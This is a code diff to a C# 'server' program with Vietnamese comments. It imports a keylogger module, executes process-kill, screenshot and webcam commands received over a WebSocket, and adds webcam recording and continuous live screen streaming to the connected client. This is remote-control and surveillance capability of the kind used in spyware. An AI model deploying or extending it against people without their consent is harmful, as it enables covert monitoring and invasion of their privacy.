@@ -11,6 +11,9 @@ using System.Threading.Tasks;
 using System.Runtime.InteropServices;
 using System.Text;
 using KeyLogger; // Đảm bảo namespace này khớp với file Keylog.cs
+using AForge.Video;
+using AForge.Video.DirectShow;
+using Accord.Video.FFMPEG;
 
 namespace server
 {
@@ -60,25 +63,33 @@ namespace server
         private async void ProcessWs(HttpListenerContext ctx)
         {
             HttpListenerWebSocketContext wsCtx = await ctx.AcceptWebSocketAsync(null);
-            WebSocket ws = wsCtx.WebSocket;
-            byte[] buf = new byte[1024 * 5000]; // Buffer lớn để nhận ảnh/video
+            WebSocket ws = wsCtx.WebSocket;   // ⭐ KHỞI TẠO ws TỪ wsCtx
+
+            globalWS = ws;       // ⭐ LƯU VÀO GLOBAL
+            StartStreaming();    // ⭐ BẮT ĐẦU STREAM SHARE SCREEN
+
+            byte[] buf = new byte[1024 * 5000];
 
             while (ws.State == WebSocketState.Open)
             {
                 try
                 {
-                    WebSocketReceiveResult res = await ws.ReceiveAsync(new ArraySegment<byte>(buf), CancellationToken.None);
+                    WebSocketReceiveResult res = await ws.ReceiveAsync(
+                        new ArraySegment<byte>(buf), CancellationToken.None);
+
                     if (res.MessageType == WebSocketMessageType.Close) break;
 
                     string cmd = Encoding.UTF8.GetString(buf, 0, res.Count);
-                    string reply = Exec(cmd); // Thực thi lệnh
+                    string reply = Exec(cmd);
 
                     byte[] outBuf = Encoding.UTF8.GetBytes(reply);
-                    await ws.SendAsync(new ArraySegment<byte>(outBuf), WebSocketMessageType.Text, true, CancellationToken.None);
+                    await ws.SendAsync(new ArraySegment<byte>(outBuf),
+                        WebSocketMessageType.Text, true, CancellationToken.None);
                 }
                 catch { break; }
             }
         }
+
 
         // XỬ LÝ LỆNH TỪ WEB CLIENT
         private string Exec(string cmd)
@@ -98,10 +109,9 @@ namespace server
                     case "KILL": Process.GetProcessById(int.Parse(p[1])).Kill(); return "LOG: Đã diệt " + p[1];
                     case "SCREENSHOT":
                 {
-                    // Lưu ảnh vào tệp thông qua SaveFileDialog
                     SaveScreenshot();
-                    // Trả về chuỗi Base64 của ảnh đã chụp
-                    return "IMG|" + Convert.ToBase64String(CapScreen());
+                    return "LOG: Screenshot saved.";
+
                 }
 
                     case "WEBCAM":
@@ -162,20 +172,112 @@ namespace server
         }
 
 
-        string RecVid(int s)
+        public string RecVid(int seconds)
         {
             try
             {
-                string p = Path.Combine(Application.StartupPath, "rec.avi");
-                if (File.Exists(p)) File.Delete(p);
-                mciSendString("open new type avivideo alias myvideo", null, 0, 0);
-                mciSendString("record myvideo", null, 0, 0);
-                Thread.Sleep(s * 1000);
-                mciSendString("save myvideo \"" + p + "\"", null, 0, 0);
-                mciSendString("close myvideo", null, 0, 0);
-                return p;
+                // Lấy danh sách webcam
+                var videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
+                if (videoDevices.Count == 0) return "LOG: Không tìm thấy webcam!";
+
+                // Chọn webcam đầu tiên
+                var videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);
+
+                // Hộp thoại lưu file
+                string savePath = "";
+                Thread t = new Thread(() =>
+                {
+                    using (SaveFileDialog save = new SaveFileDialog())
+                    {
+                        save.Filter = "AVI Video (*.avi)|*.avi";
+                        save.Title = "Chọn nơi lưu video webcam";
+                        save.FileName = "webcam_record.avi";
+
+                        if (save.ShowDialog() == DialogResult.OK)
+                        {
+                            savePath = save.FileName;
+                        }
+                    }
+                });
+
+                t.SetApartmentState(ApartmentState.STA);
+                t.Start();
+                t.Join();
+
+                if (string.IsNullOrEmpty(savePath))
+                    return "LOG: Không chọn đường dẫn lưu video.";
+
+                var writer = new Accord.Video.FFMPEG.VideoFileWriter();
+                bool writerOpened = false;
+
+                videoSource.NewFrame += (s, e) =>
+                {
+                    try
+                    {
+                        Bitmap frame = (Bitmap)e.Frame.Clone();
+
+                        if (!writerOpened)
+                        {
+                            writer.Open(savePath, frame.Width, frame.Height, 30,
+                                Accord.Video.FFMPEG.VideoCodec.MPEG4);
+
+                            writerOpened = true;
+                        }
+
+                        writer.WriteVideoFrame(frame);
+                        frame.Dispose();
+                    }
+                    catch { }
+                };
+
+                // BẮT ĐẦU QUAY
+                videoSource.Start();
+
+                Thread.Sleep(seconds * 1000);
+
+                // DỪNG CAMERA
+                videoSource.SignalToStop();
+                while (videoSource.IsRunning) Thread.Sleep(100);
+
+                if (writerOpened)
+                    writer.Close();
+
+                return "LOG: Video đã lưu tại: " + savePath;
             }
-            catch { return ""; }
+            catch (Exception ex)
+            {
+                return "LOG: Lỗi quay webcam: " + ex.Message;
+            }
         }
+
+        WebSocket globalWS = null;
+
+        void StartStreaming()
+        {
+            new Thread(async () =>
+            {
+                while (true)
+                {
+                    try
+                    {
+                        if (globalWS != null && globalWS.State == WebSocketState.Open)
+                        {
+                            byte[] img = CapScreen();
+                            string base64 = Convert.ToBase64String(img);
+                            byte[] send = Encoding.UTF8.GetBytes("LIVE|" + base64);
+
+                            await globalWS.SendAsync(new ArraySegment<byte>(send),
+                                WebSocketMessageType.Text, true, CancellationToken.None);
+                        }
+                    }
+                    catch { }
+
+                    Thread.Sleep(100); // stream ~10 fps
+                }
+            })
+            { IsBackground = true }.Start();
+        }
+
+
     }
 }
